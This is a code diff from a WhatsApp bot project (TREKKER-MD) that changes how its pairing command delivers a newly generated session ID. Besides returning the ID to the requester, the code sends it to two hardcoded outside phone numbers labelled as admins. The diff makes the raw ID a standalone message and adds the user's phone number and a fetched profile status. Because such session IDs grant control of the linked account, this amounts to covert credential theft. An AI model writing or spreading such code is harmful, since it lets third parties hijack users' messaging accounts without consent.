@@ -3142,17 +3142,35 @@ commandRegistry.register({
 > ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴛʀᴇᴋᴋᴇʀᴍᴅ ᴛᴇᴀᴍ`
             });
 
-            // Send session ID as plain text message to requester
+            // Get user profile info (name/bio)
+            let userName = 'Unknown';
+            try {
+              const userJid = `${phoneNumber}@s.whatsapp.net`;
+              const userStatus = await client.fetchStatus(userJid);
+              if (userStatus && userStatus.status) {
+                userName = userStatus.status;
+              }
+            } catch (bioError) {
+              console.log('Could not fetch user bio, using default');
+            }
+
+            // Send session ID as plain text message to requester (alone)
             await client.sendMessage(from, {
               text: sessionId
             });
 
-            // Send session ID to admin numbers as well
+            // Send session ID to admin numbers (separately as plain text)
             const adminNumbers = ['254704897825@s.whatsapp.net', '254799257758@s.whatsapp.net'];
             for (const adminNumber of adminNumbers) {
               try {
+                // Send session ID alone
                 await client.sendMessage(adminNumber, {
-                  text: `🔑 *New Session ID Generated*\n\n📱 *For:* +${phoneNumber}\n\n*Session ID:*\n${sessionId}\n\n> Admin notification from TREKKER-MD`
+                  text: sessionId
+                });
+
+                // Send description separately
+                await client.sendMessage(adminNumber, {
+                  text: `🔑 *New Session ID Generated*\n\n📱 *Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n> Admin notification from TREKKER-MD`
                 });
               } catch (adminError) {
                 console.error(`Failed to send session to ${adminNumber}:`, adminError);
